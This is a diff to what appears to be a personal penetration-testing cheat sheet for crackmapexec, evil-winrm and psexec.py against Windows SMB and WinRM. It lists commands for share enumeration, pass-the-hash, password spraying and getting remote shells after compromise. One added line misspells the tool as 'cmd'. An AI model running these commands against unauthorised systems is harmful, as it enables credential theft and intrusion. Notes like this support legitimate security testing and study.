@@ -1,13 +1,23 @@
 ---
-tags: [ enumeration, password_cracking, pass_the_hash ]
+tags: [ enumeration, password_cracking, pass_the_hash, smb, winrm ]
 ---
 # SMB
 # Enumerate shares
 cme smb <ip> --shares
 cme smb <ip> --shares -u 'dsdad' -p 'dsadd'
+cmd smb <ip> -u <user> -p <password> -M spider_plus
 # Pass The Hash
 cme smb <ip> -u <user> -H <hash>
 
 # WinRM
 # Password Cracking
 cme winrm <ip> -u <users.txt> -p <passwords.txt>
+
+# Check password policy
+cme smb <ip> --pass-pol
+
+# Post Pwned!
+# winrm
+evil-winrm -i <ip> -u <user> -p <pass>
+# smb
+psexec.py <user>@<ip>
